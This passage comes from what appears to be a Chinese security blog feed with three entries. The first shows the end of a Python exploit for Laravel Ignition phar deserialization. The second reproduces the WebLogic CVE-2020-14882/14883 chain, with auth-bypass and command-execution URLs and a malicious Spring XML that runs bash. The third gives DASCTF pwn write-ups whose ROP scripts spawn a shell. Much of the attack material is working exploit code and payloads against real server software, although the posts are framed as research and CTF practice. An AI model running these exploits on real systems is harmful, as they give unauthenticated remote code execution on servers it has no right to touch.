class="number">00</span>=<span class="number">4</span>C=<span class="number">00=32=00=32</span>=<span class="number">00=52=00=68</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=66=00=69</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=33=00=33</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=45</span>=<span class="number">00=64=00=43</span>=<span class="number">00=54=00=55</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">3</span>D=<span class="number">00</span>a"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">        '''</span><br><span class="line">        _headers = &#123;</span><br><span class="line">            "Content-Type": "application/json"</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(req_url, data=payload, headers=_headers, allow_redirects=False)</span><br><span class="line">        return resp.text</span><br><span class="line">    def restore_payload(self,schema, host, port):</span><br><span class="line">        base_url = "&#123;&#125;://&#123;&#125;:&#123;&#125;".format(schema, host, port)</span><br><span class="line">        path = "/_ignition/execute-solution"</span><br><span class="line">        req_url = "&#123;&#125;&#123;&#125;".format(base_url, path)</span><br><span class="line">        payload ='''</span><br><span class="line">&#123;</span><br><span class="line">  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",</span><br><span class="line">  "parameters": &#123;</span><br><span class="line">    "variableName": "username",</span><br><span class="line">    "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-<span class="number">16</span>le.utf-<span class="number">8</span>|convert.base64-decode/resource=../storage/logs/laravel.log"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">'''</span><br><span class="line">        _headers = &#123;</span><br><span class="line">            "Content-Type": "application/json"</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(req_url, data=payload, headers=_headers, allow_redirects=False)</span><br><span class="line">        return resp.status_code</span><br><span class="line">    def phar_unserialize(self,schema, host, port):</span><br><span class="line">        base_url = "&#123;&#125;://&#123;&#125;:&#123;&#125;".format(schema, host, port)</span><br><span class="line">        path = "/_ignition/execute-solution"</span><br><span class="line">        req_url = "&#123;&#125;&#123;&#125;".format(base_url, path)</span><br><span class="line">        payload = '''</span><br><span class="line">&#123;</span><br><span class="line">  "solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution",</span><br><span class="line">  "parameters": &#123;</span><br><span class="line">    "variableName": "username",</span><br><span class="line">    "viewFile": "phar://../storage/logs/laravel.log/test.txt"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">        '''</span><br><span class="line">        _headers = &#123;</span><br><span class="line">            "Content-Type": "application/json"</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(req_url, data=payload, headers=_headers, allow_redirects=False)</span><br><span class="line">        return resp.text</span><br><span class="line">    def crack(self, schema, host, port):</span><br><span class="line">        for i in range(<span class="number">3</span>):</span><br><span class="line">            if self.clear_log(schema, host, port)==<span class="number">200</span>:</span><br><span class="line">                print("laravel log cleard")</span><br><span class="line">                self.add_prefix(schema, host, port)</span><br><span class="line">                self.send_payload(schema, host, port)</span><br><span class="line">                if self.restore_payload(schema, host, port)==<span class="number">200</span>:</span><br><span class="line">                    print("successfully converted to phar")</span><br><span class="line">                    resp_text=self.phar_unserialize(schema, host, port)</span><br><span class="line">                    if "uid=" in resp_text and "gid=" in resp_text:</span><br><span class="line">                        print("phar unserialize")</span><br><span class="line">                        print(resp_text.split("\n")[-<span class="number">2</span>])</span><br><span class="line">                        break</span><br><span class="line">                else:</span><br><span class="line">                    print("converted to phar fails")</span><br><span class="line">            else:</span><br><span class="line">                print("laravel log clear fails")</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    poc = Poc()</span><br><span class="line">    poc.crack(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure></div>

<p>直接利用EXP：</p>
<p><img src="https://i.loli.net/2021/04/11/DcGUA6Igqm4xeX9.png" alt="img"></p>
<h4 id="最后小结"><a href="#最后小结" class="headerlink" title="最后小结"></a><strong>最后小结</strong></h4><p>经过上面的漏洞分析，我们知道我们可以通过<code>file_put_contents()</code>写入任意数据至 log 文件，然后经 <code>file_get_contents()</code>读回</p>
<p>phar 反序列化 RCE (<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a>)</p>
<p>php://filter 多个过滤器配合妙用 (<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com</a>)</p>
]]></content>
      <tags>
        <tag>CVE</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-14882&amp;14883漏洞分析</title>
    <url>/2020/12/05/CVE-2020-14882-14883%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="CVE-2020-14882-amp-14883-weblogic未授权访问漏洞"><a href="#CVE-2020-14882-amp-14883-weblogic未授权访问漏洞" class="headerlink" title="CVE-2020-14882&amp;14883 weblogic未授权访问漏洞"></a><strong>CVE-2020-14882&amp;14883 weblogic未授权访问漏洞</strong></h3><p><img src="https://i.loli.net/2021/04/05/jWBu8qPnEQx6Ysg.png" alt="img"></p>
<a id="more"></a>

<h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a><strong>漏洞概述</strong></h4><p>CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h4><p><code>Oracle:Weblogic</code></p>
<ul>
<li>10.3.6.0.0</li>
<li>12.1.3.0.0</li>
<li>12.2.1.3.0</li>
<li>12.2.1.4.0</li>
<li>14.1.1.0.0</li>
</ul>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><strong>环境搭建</strong></h4><p>### docker-compose.yml</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YML"><figure class="iseeu highlight /yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">weblogic:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/weblogic:12.2.1.3-2018</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">"7001:7001"</span></span><br></pre></td></tr></table></figure></div>

<p>执行以下命令会下载镜像并以此镜像启动一个容器，映射的端口为7001</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></div>

<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><p><strong>权限绕过漏洞（CVE-2020-14882）</strong></p>
<p>因为CVE-2020-14882未授权访问漏洞是绕过管理控制台权限访问后台，所以需要存在console控制台，打开浏览器访问：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//your_ip:port/console</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/05/7unLUFvZYlfI3rz.png" alt="img"></p>
<p>出现此页面是说明网站是存在管理控制台的，在正常访问console后台时会让我们输入账号密码。通过未授权访问，则可以直接绕过验证登录后台，漏洞URL：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">/console/css/%<span class="number">252</span>e%<span class="number">252</span>e%<span class="number">252f</span>console.portal</span><br></pre></td></tr></table></figure></div>

<p>未授权访问控制界面：</p>
<p><img src="https://i.loli.net/2021/04/05/t1FA3KvdRZlcs2P.png" alt="img"></p>
<p>但相比较我们正常登录的授权界面，未授权界面由于权限不足，缺少部署等功能，无法安装应用，所以也无法通过后台部署war包等方式直接获取权限。上面路径中的<code>%252E%252E%252F</code>为二次url编码的<code>../</code>，通过这个就可以实现穿越路径未授权访问相关管理后台。</p>
<p><img src="https://i.loli.net/2021/04/05/RuYnB4sEzODoSTg.png" alt="img"></p>
<p><strong>后台任意命令执行漏洞（CVE-2020-14883）</strong></p>
<p>这个漏洞的利用方式有两种，一是通过<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>，二是通过<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code></p>
<p>利用方式一：</p>
<p>直接访问如下URL，即可利用<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>执行命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">http://your-ip:<span class="number">7001</span>/console/css/<span class="symbol">%252</span>e<span class="symbol">%252</span>e<span class="symbol">%252</span>fconsole.portal?_nfpb=<span class="keyword">true</span>&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel<span class="number">2</span>.sh.ShellSession(<span class="string">"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');"</span>)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/05/1AngEGkxKLaI53s.png" alt="img"></p>
<p>进入容器，可以发现<code>touch /tmp/success1</code>已成功执行：</p>
<p><img src="https://i.loli.net/2021/04/05/3eVZ6aUYyhlzDwt.png" alt="img"></p>
<p>但此利用方法只能在 Weblogic 12.2.1 及以上版本利用，因为 10.3.6 并不存在 <code>com.tangosol.coherence.mvel2.sh.ShellSession</code> 类。</p>
<p>利用方式二：</p>
<p><code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>是一种更为通杀的方法，最早在CVE-2019-2725被提出，对于所有Weblogic版本均有效。</p>
<p>首先，我们需要构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上，如<a href="http://your_ip/rce.xml：" target="_blank" rel="noopener">http://your_ip/rce.xml：</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span> <span class="attr">init-method</span>=<span class="string">"start"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>&lt;![CDATA[touch /tmp/success2]]&gt;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XQUERY"><figure class="iseeu highlight /xquery"><table><tr><td class="code"><pre><span class="line">http://your-ip:<span class="number">7001</span>/console/css/<span class="meta">%252e</span><span class="meta">%252e</span><span class="meta">%252fconsole</span>.portal?_nfpb<span class="built_in">=true</span>&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.<span class="keyword">context</span>.support.FileSystemXmlApplicationContext(<span class="string">"http://your-ip/rce.xml"</span>)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/05/f483BN2GWTbFPVk.png" alt="img"></p>
<p>进行url跳转，成功执行<code>touch /tmp/success2</code>命令，以此证明可执行任意rce命令，从而getshell：</p>
<p><img src="https://i.loli.net/2021/04/05/vEWgSPapH4zVIQR.png" alt="img"></p>
<p>这个利用方法也有自己的缺点，就是需要Weblogic的服务器能够访问到恶意XML。</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><strong>参考链接</strong></h4><p><a href="https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md" target="_blank" rel="noopener"><strong>https://github.com/vulhub/vulhub/blob/master/weblogic/CVE-2020-14882/README.zh-cn.md</strong></a></p>
<p><a href="https://github.com/jas502n/CVE-2020-14882" target="_blank" rel="noopener"><strong>https://github.com/jas502n/CVE-2020-14882</strong></a></p>
]]></content>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF-May</title>
    <url>/2020/05/26/DASCTF-May/</url>
    <content><![CDATA[<p>真的打不动。。给出几个pwn的相关题解</p>
<a id="more"></a>

<h2 id="TaQiniOj-0"><a href="#TaQiniOj-0" class="headerlink" title="TaQiniOj-0"></a>TaQiniOj-0</h2><p>让写一个C程序将flag读出来，输入TaQini会自动出现tree flag的提示，然后试着读取那个目录，发现/home/ctf/flag都被禁用了，试着进行拼接：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">60</span>];</span><br><span class="line">    <span class="keyword">char</span> file[<span class="number">30</span>];</span><br><span class="line">    strcpy(file,'/ho');</span><br><span class="line">    strcat(file,'me/');</span><br><span class="line">    strcat(file,'ct');</span><br><span class="line">    strcat(file,'f/');</span><br><span class="line">    strcat(file,'fl');</span><br><span class="line">    strcat(file,'ag');</span><br><span class="line">    <span class="keyword">int</span> fd=fopen(file,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd,s,<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory Monster I"></a>Memory Monster I</h2><p>就是一个简单的绕过canary，修改__stack_chk_fail_got为backdoor即可</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">'./Monster'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./Monster'</span>)</span><br><span class="line">system_addr=<span class="number">0x40124A</span></span><br><span class="line">__stack_chk_fail_got=elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line"></span><br><span class="line">payload=p64(__stack_chk_fail_got)+<span class="string">'a'</span>*<span class="number">0x28</span></span><br><span class="line">io.recvuntil(<span class="string">'addr:'</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'data:'</span>)</span><br><span class="line">io.send(p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="Monster-2"><a href="#Monster-2" class="headerlink" title="Monster-2"></a>Monster-2</h2><p>静态编译，fini_aray劫持</p>
<p><img src="/images/BJDCTF3/clipboard.png" alt="clipboard"></p>
<p>图片来源：<a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener">http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html</a></p>
<p>程序的入口是._start函数，它会调用libc_start_main函数，看一下libc_start_main函数的原型：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">libc_start_main函数原型： </span><br><span class="line">__libc_start_main(main,argc,argv&amp;env,init,fini,rtld_fini)</span><br></pre></td></tr></table></figure></div>

<p>因为64位程序通过寄存器来保存前六个参数，所以：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">rdi &lt;- main </span><br><span class="line">rcx &lt;- __libc_csu_init</span><br><span class="line">r8 &lt;- __libc_scu_fini</span><br></pre></td></tr></table></figure></div>

<p>也就是说我们可以从_start函数中得到这三个函数的地址。</p>
<ul>
<li>静态链接下的fini_array劫持</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">fini_array[<span class="number">0</span>]:__libc_csu_fini </span><br><span class="line">fini_array[<span class="number">1</span>]:main函数地址</span><br></pre></td></tr></table></figure></div>

<p>之后则可以形成一个循环链，然后任意地址写，可以在fini_array[2]之后构建ROP链，最后再将fini_array[0]改成leave_ret，fini_array[1]改成ret执行后接ROP链</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">'./Monster2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(address,content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"addr:"</span>,p64(address))</span><br><span class="line">    io.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">fini_array=<span class="number">0x4B80B0</span></span><br><span class="line">__libc_csu_fini=<span class="number">0x402CB0</span></span><br><span class="line">main_addr=<span class="number">0x401C1D</span></span><br><span class="line"><span class="comment">#----- 构造一个循环链 ------#</span></span><br><span class="line">func(fini_array,p64(__libc_csu_fini)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">pop_rdx_rsi=<span class="number">0x44baf9</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401746</span></span><br><span class="line">mov_rax_rdx=<span class="number">0x41B380</span></span><br><span class="line">pop_rax_ret=<span class="number">0x448fcc</span></span><br><span class="line">pop_rdx_ret=<span class="number">0x448415</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x406f80</span></span><br><span class="line">syscall=<span class="number">0x402514</span></span><br><span class="line">binsh=<span class="number">0x492895</span></span><br><span class="line">leave_ret=<span class="number">0x401CF3</span></span><br><span class="line">ret=<span class="number">0x401016</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">59</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">addr binsh</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">func(binsh,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">func(fini_array+<span class="number">0x10</span>,p64(pop_rax_ret))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">8</span>,p64(<span class="number">59</span>))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x10</span>,p64(pop_rdi_ret))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x18</span>,p64(binsh))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x20</span>,p64(pop_rdx_ret))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x28</span>,p64(<span class="number">0</span>))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x30</span>,p64(pop_rsi_ret))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x38</span>,p64(<span class="number">0</span>))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x40</span>,p64(syscall))</span><br><span class="line">func(fini_array,p64(leave_ret)+p64(ret))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="Monster-3"><a href="#Monster-3" class="headerlink" title="Monster-3"></a>Monster-3</h2><p>跟上题类似，直接贴出脚本：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./Monster_III'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">io=process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(address,content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"addr:"</span>,p64(address))</span><br><span class="line">    io.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">fini_array=<span class="number">0x4b50b0</span></span><br><span class="line">libc_csu_fini=<span class="number">0x402CA0</span></span><br><span class="line">main_addr=<span class="number">0x401C1D</span></span><br><span class="line">func(fini_array,p64(libc_csu_fini)+p64(main_addr))</span><br><span class="line"></span><br><span class="line">pop_rax=<span class="number">0x44806C</span></span><br><span class="line">pop_rdi=<span class="number">0x401746</span></span><br><span class="line">pop_rsi=<span class="number">0x406f70</span></span><br><span class="line">pop_rdx=<span class="number">0x447635</span></span><br><span class="line"></span><br><span class="line">binsh=<span class="number">0x4B769A</span>   <span class="comment"># 任意</span></span><br><span class="line">syscall=<span class="number">0x402504</span></span><br><span class="line">leave_ret=<span class="number">0x401cf3</span></span><br><span class="line">ret=<span class="number">0x401016</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">0x3b</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">addr binsh</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">func(binsh,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">func(fini_array+<span class="number">0x10</span>,p64(pop_rax))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">8</span>,p64(<span class="number">0x3b</span>))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x10</span>,p64(pop_rdi))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x18</span>,p64(binsh))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x20</span>,p64(pop_rdx))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x28</span>,p64(<span class="number">0</span>))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x30</span>,p64(pop_rsi))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x38</span>,p64(<span class="number">0</span>))</span><br><span class="line">func(fini_array+<span class="number">0x10</span>+<span class="number">0x40</span>,p64(syscall))</span><br><span class="line">func(fini_array,p64(leave_ret)+p64(ret))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h2><p><strong>思路：</strong></p>
<ul>
<li>“/dev/random”每次open都没有close，默认情况下，一个进程最大文件描述符是1023（一共1024个），所以只要后面文件描述符用尽，读出来的就是”\x00”了</li>
<li>利用上面的思路，成功233次后，就可以利用rop了</li>
<li>题目应该是不能直接拿shell的，所以就上orw，因为标准输入流0被关闭了，所以打开的flag文件的描述符就是0了，直接从0读就能拿到flag</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./secret2'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">io=process(binary)</span><br><span class="line"></span><br><span class="line">gadget_1=<span class="number">0x4015F8</span></span><br><span class="line">gadget_2=<span class="number">0x401612</span></span><br><span class="line">flag_addr=<span class="number">0x4021Df</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x40161b</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x401619</span></span><br><span class="line">open_plt=elf.plt[<span class="string">'open'</span>]</span><br><span class="line">read_got=elf.got[<span class="string">'read'</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">payload=<span class="string">'A'</span>*(<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload+=flat([pop_rdi,flag_addr])</span><br><span class="line">payload+=flat([pop_rsi_r15,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">payload+=flat([open_plt])</span><br><span class="line">payload+=flat([gadget_2,<span class="number">0</span>,<span class="number">1</span>,read_got,<span class="number">0</span>,elf.bss()+<span class="number">0x50</span>,<span class="number">0x40</span>])</span><br><span class="line">payload+=flat([gadget_1,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">payload+=flat([pop_rdi,elf.bss()+<span class="number">0x50</span>])</span><br><span class="line">payload+=flat([puts_plt])</span><br><span class="line">io.recvuntil(<span class="string">"name? "</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span><span class="number">-1</span>+<span class="number">232</span>):</span><br><span class="line">    io.recv()</span><br><span class="line">    io.send(<span class="string">'\x00'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <tags>
        <tag>DASCTF pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>NodeJs从零开始到原型链污染</title>
